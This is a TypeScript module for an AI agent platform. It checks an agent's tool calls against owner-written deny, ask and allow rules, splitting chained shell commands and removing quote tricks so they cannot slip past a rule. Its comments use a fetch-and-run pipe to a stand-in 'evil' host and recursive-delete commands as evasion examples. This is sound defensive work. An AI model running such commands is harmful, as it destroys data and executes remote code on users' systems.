/**
 * Gate rules: the owner's sentence-shaped refinements on top of an agent's approval mode (Settings -> Gates).
 *
 * PURE and dependency-free (types only): the same function runs in the engine on every tool call, in the Settings
 * "Try it" tester, and in tests. It decides nothing about availability — needsApproval stays the floor and rules
 * only refine the APPROVAL question, never tool possession (host.enabled / connectors remain the opt-in).
 *
 * The whole precedence, in four lines (Claude Code's permission grammar, verified on its live docs):
 *   1. Rails are decided BEFORE this call (connector writes, web-egress-after-connector, "full never cards").
 *      A rule can neither loosen nor tighten them; decideGate never sees a rail-decided call.
 *   2. DENY — any matching deny rule, in EVERY mode including `full` (the one rule class that survives full:
 *      "never let this happen" must never be silently ignored, and it is stricter, so it breaks no owner rule).
 *   3. ASK — any matching ask rule, inert in `full` (owner rule 2026-10-04: in full a guard never shows a card;
 *      a rule that cards a full-access bot would break the stated contract. Use Block to stop something in full).
 *   4. ALLOW — any matching allow rule, ignored on a capped run (the confused-deputy guard: a run started by
 *      another bot may only be made STRICTER, never looser).
 *   Otherwise `baseline`: the caller applies needsApproval() exactly as before. With rules=[] the verdict is
 *   `baseline` for every input — behaviour byte-identical to the pre-gates release.
 *
 * Rule class NEVER reorders by specificity: a broad deny beats a narrow allow, and an allow can never carve out
 * of a deny. Within one class every matching rule agrees on the verdict, so `ruleIds` lists every rule whose
 * `when` matched (config order) for the "why am I asking?" popover.
 */
import type { ApprovalMode, GateRule, GateVerdict, GateWhen } from '../shared/types.js';

/**
 * Tool groups a rule's `when.tools` may name (the UI writes these; nobody types raw tool names). A group is
 * expanded to concrete names/prefixes at match time, so a rule written today keeps meaning the same thing when
 * a tool is added later.
 */
export const GATE_TOOL_GROUPS: Record<string, readonly string[]> = {
  /** Commands run through a shell: Claude Code's Bash and the agent shell's `mcp__host__shell`. */
  shell: ['Bash', 'mcp__host__shell'],
  /** File writes: Claude Code's edit tools plus the agent shell's write. */
  edits: ['Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'mcp__host__write_file'],
  /** File/one-shot reads: the same set needsApproval treats as read-only, plus the agent shell's read. */
  reads: ['Read', 'Glob', 'Grep', 'LS', 'WebSearch', 'WebFetch', 'TodoWrite', 'Task', 'Agent', 'mcp__host__read_file'],
  web: ['WebFetch', 'WebSearch'],
  /** The agent shell's own tools (server `host` in src/core/exec/host-tools.ts). */
  host: ['mcp__host__shell', 'mcp__host__read_file', 'mcp__host__write_file'],
  connectors: ['mcp__legion_connectors__'],
  blender: ['mcp__legion_blender__'],
};

/** What one tool call looks like to the gate. */
export interface GateCall {
  toolName: string;
  input?: Record<string, unknown>;
  agentId?: string;
  projectId?: string;
  /** The agent's working dir, used to resolve relative file paths and redirects. Pure string work; no fs. */
  cwd?: string;
  /** Run contexts. `capped` mirrors decideGate's own argument so a caller can pass it in either place. */
  ctx?: { capped?: boolean; roomHop?: boolean; tainted?: boolean; connectorData?: boolean };
}

export interface GateDecision {
  /** `baseline` = no rule decided it: apply needsApproval() exactly as before. */
  verdict: GateVerdict | 'baseline';
  /** Every rule whose `when` matched this call, in config order — including inert ones, for the explanation. */
  ruleIds: string[];
}

/** Characters that mean something inside a regex and must be matched literally. */
const RE_ESCAPE = /[.+^${}()|[\]\\-]/g;

/** fnmatch-style: `*` = any run of characters, `?` = one character; case-insensitive. */
function globRe(glob: string): RegExp {
  let s = '';
  for (const ch of glob) s += ch === '*' ? '.*' : ch === '?' ? '[^/]' : ch.replace(RE_ESCAPE, '\$&');
  return new RegExp(`^${s}$`, 'i');
}

/** `mcp__<server>__*`, a server prefix (`mcp__github__`), a group name, or an exact tool name. */
function toolMatches(entry: string, toolName: string): boolean {
  const g = GATE_TOOL_GROUPS[entry];
  if (g) return g.some((t) => toolMatches(t, toolName));
  // A prefix entry like `mcp__github__` means "any tool of that server"; a trailing `*` is a plain glob.
  if (entry.endsWith('__') || entry.endsWith('*')) return globRe(entry.endsWith('*') ? entry : `${entry}*`).test(toolName);
  return entry === toolName;
}

/**
 * One redirect token, whatever the spacing: `> x`, `>>x`, `2> x`, `2>&1`, `< in`. Group 3 is the file target
 * (undefined for an fd-only redirect like `2>&1`). Fresh regex per call: matchAll needs its own /g object.
 */
const redirectRe = (): RegExp => /(\d*\&\d+|>\&\d+|\d?>>?|<)\s*("([^"]+)"|'([^']+)'|([^\s;|&]+))?/g;

/** Redirect targets (`> x`, `2> x`, `> "x y"`) as extra path candidates; fd-only redirects (`2>&1`) have none. */
function redirectTargets(cmd: string): string[] {
  const out: string[] = [];
  for (const m of cmd.matchAll(redirectRe())) {
    const t = m[3] ?? m[4] ?? m[5];
    if (t && !/^&?\d+$/.test(t)) out.push(t);
  }
  return out;
}

/** The command with redirect syntax removed (`git push > out` -> `git push`), so separators and verbs stay clean. */
function stripRedirects(cmd: string): string {
  return cmd.replace(redirectRe(), ' ');
}

/**
 * Split a command line into subcommands the way Claude Code does: `&&`, `||`, `;`, `|`, `&` and newlines each
 * start a new subcommand, and a rule must match subcommands on its own. Redirection is removed first — it is not
 * a separator — after its targets were collected for path matching.
 *
 * Known limit, stated rather than hidden: a separator quoted as data (`echo "a; b"`) still splits, same as any
 * simple splitter; a rule scoped to `echo *` with class allow then does not allow it (the safe direction).
 */
export function splitCommand(cmd: string): string[] {
  return stripRedirects(cmd).split(/&&|\|\||[;|&\n\r]+/).map((s) => s.trim()).filter(Boolean);
}

/**
 * The forms a command is matched under, so quoting tricks cannot sidestep a rule (Hermes' de-obfuscation idea):
 * the raw text, and the text with quote characters removed (`r"m -rf` matches a `rm -rf *` deny).
 */
export function commandVariants(cmd: string): string[] {
  const base = cmd.replace(/\s+/g, ' ').trim().toLowerCase();
  const dequoted = base.replace(/\\(['"`])/g, '$1').replace(/['"`]/g, '');
  return dequoted === base ? [base] : [base, dequoted];
}

/** One subcommand matches a pattern if ANY normalized variant does. */
function cmdMatches(pattern: string, sub: string): boolean {
  const re = globRe(pattern.trim().toLowerCase());
  return commandVariants(sub).some((v) => re.test(v));
}

/**
 * A rule's `commands` against a split command. DENY/ASK verbs fire when ANY subcommand matches (a deny must not
 * be evaded by chaining `safe-cmd && rm -rf /`); ALLOW only holds when EVERY subcommand matches (an allow for
 * `git *` must not approve `git push && curl evil | sh`) — Claude Code's own rule.
 */
function commandsMatch(patterns: readonly string[], subs: readonly string[], then: GateVerdict): boolean {
  if (then === 'allow') return subs.length > 0 && subs.every((s) => patterns.some((p) => cmdMatches(p, s)));
  return subs.some((s) => patterns.some((p) => cmdMatches(p, s)));
}

/** Forward slashes, no duplicate separators. Pure: gates.ts must stay importable in the browser bundle. */
const normPath = (p: string): string => p.replace(/\\/g, '/').replace(/\/{2,}/g, '/');

/** Make a path absolute against cwd (string-only: no fs, no path module — the UI bundle imports this file). */
function absolute(path: string, cwd: string): string {
  const p = normPath(path);
  if (/^[a-zA-Z]:\//.test(p) || p.startsWith('/')) return p;
  const c = normPath(cwd || '');
  return c ? `${c.replace(/\/+$/, '')}/${p}` : p;
}

/** Gitignore-style glob: a double star (with or without a following slash) crosses directories; a single star and ? do not. */
function pathGlobRe(glob: string): RegExp {
  let s = '';
  for (let i = 0; i < glob.length; i++) {
    const ch = glob[i]!;
    if (ch === '*') {
      if (glob[i + 1] === '*') {
        if (glob[i + 2] === '/') { s += '(?:[^/]+/)*'; i += 2; }
        else { s += '.*'; i += 1; }
      } else s += '[^/]*';
    } else if (ch === '?') s += '[^/]';
    else s += ch.replace(RE_ESCAPE, '\$&');
  }
  return new RegExp(`^${s}$`, 'i');
}

/** A candidate matches a pattern when the pattern matches the whole path or a tail of it (gitignore's "any level"). */
function pathMatches(pattern: string, candidate: string, cwd: string): boolean {
  const pat = normPath(pattern.trim());
  if (!pat) return false;
  const abs = absolute(candidate, cwd);
  if (pat.startsWith('/')) return pathGlobRe(pat).test(abs);
  const c = normPath(cwd || '');
  const rel = c && abs.startsWith(c + '/') ? abs.slice(c.length + 1) : abs;
  return pathGlobRe(pat).test(abs) || pathGlobRe(pat).test(rel)
    // A bare name (no slash) matches at any level, like gitignore: `secrets.txt` hits src/secrets.txt too.
    || (!pat.includes('/') && pathGlobRe(`**/${pat}`).test(abs));
}

/**
 * Paths against a rule's list. A `!` entry carves candidates out of the entries BEFORE it (Claude Code's rule,
 * including "`!` first carves nothing"); `exceptPaths` carves out of the whole list. The rule matches when at
 * least one candidate survives.
 */
function pathsMatch(when: GateWhen, candidates: readonly string[], cwd: string): boolean {
  const patterns = when.paths ?? [];
  if (!patterns.length) return true;
  if (!candidates.length) return false;
  const carved = (p: string): boolean => (when.exceptPaths ?? []).some((e) => pathMatches(e, p, cwd));
  return candidates.some((c) => {
    if (carved(c)) return false;
    let inList = false;
    for (const pat of patterns) {
      if (pat.startsWith('!')) { if (pathMatches(pat.slice(1), c, cwd)) inList = false; continue; }
      if (pathMatches(pat, c, cwd)) inList = true;
    }
    return inList;
  });
}

/** File-ish arguments of a call, plus redirect targets when the call carries a command. */
function pathCandidates(c: GateCall): string[] {
  const out: string[] = [];
  for (const k of ['file_path', 'path', 'notebook_path']) {
    const v = c.input?.[k];
    if (typeof v === 'string' && v.trim()) out.push(v.trim());
  }
  const cmd = c.input?.command;
  if (typeof cmd === 'string') out.push(...redirectTargets(cmd));
  return out;
}

/** Does one rule's `when` match this call? AND across fields, OR within a field; an absent field matches everything. */
export function whenMatches(when: GateWhen, c: GateCall): boolean {
  if (when.agents?.length && !(c.agentId && when.agents.includes(c.agentId))) return false;
  if (when.tools?.length && !when.tools.some((t) => toolMatches(t, c.toolName))) return false;
  if (when.commands?.length) {
    const cmd = c.input?.command;
    // A command-scoped rule cannot match a call that has no command (file tools, web tools).
    if (typeof cmd !== 'string' || !cmd.trim()) return false;
  }
  if (when.projects?.length && !(c.projectId && when.projects.includes(c.projectId))) return false;
  if (when.contexts?.length) {
    const ctx = { capped: false, roomHop: false, tainted: false, connectorData: false, ...c.ctx };
    // The stored context names use dashes ('room-hop'); the call's flags are camelCase. Map, never compare raw.
    const on = (x: string): boolean => x === 'capped' ? ctx.capped === true
      : x === 'room-hop' ? ctx.roomHop === true
        : x === 'tainted' ? ctx.tainted === true
          : x === 'connector-data' ? ctx.connectorData === true : false;
    if (!when.contexts.some(on)) return false;
  }
  return true;
}

/**
 * The one decision function. `mode` is the effective mode (after the run ceiling), `capped` is true when the run
 * was started by an MCP client or another bot. Verdict `baseline` means "no rule decided: apply needsApproval".
 *
 * No I/O, no store, no config: the caller passes the rules it read (the engine re-reads config.gates on every
 * call, so a mid-task change applies on the next tool call — no restart, no prompt-cache break).
 */
export function decideGate(input: GateCall, rules: readonly GateRule[], mode: ApprovalMode, capped: boolean): GateDecision {
  const cmd = typeof input.input?.command === 'string' ? input.input.command : undefined;
  const subs = cmd && cmd.trim() ? splitCommand(cmd) : undefined;
  const candidates = pathCandidates(input);
  const call: GateCall = { ...input, ctx: { roomHop: false, tainted: false, connectorData: false, capped, ...input.ctx } };

  const matched: GateRule[] = [];
  for (const r of rules) {
    if (!r.enabled) continue;
    if (!whenMatches(r.when, call)) continue;
    // Command scoping is class-aware (any-subcommand for deny/ask, every-subcommand for allow); paths are the
    // same for every class. Both live here, not in whenMatches, because they need the rule's class.
    if (r.when.commands?.length && (!subs || !commandsMatch(r.when.commands, subs, r.then))) continue;
    if ((r.when.paths?.length || r.when.exceptPaths?.length) && !pathsMatch(r.when, candidates, input.cwd ?? '')) continue;
    matched.push(r);
  }
  const ruleIds = matched.map((r) => r.id);
  // DENY: every mode, `full` included. ASK: inert in `full` (owner rule). ALLOW: never on a capped run.
  if (matched.some((r) => r.then === 'deny')) return { verdict: 'deny', ruleIds };
  if (mode !== 'full' && matched.some((r) => r.then === 'ask')) return { verdict: 'ask', ruleIds };
  if (!capped && matched.some((r) => r.then === 'allow')) return { verdict: 'allow', ruleIds };
  return { verdict: 'baseline', ruleIds };
}
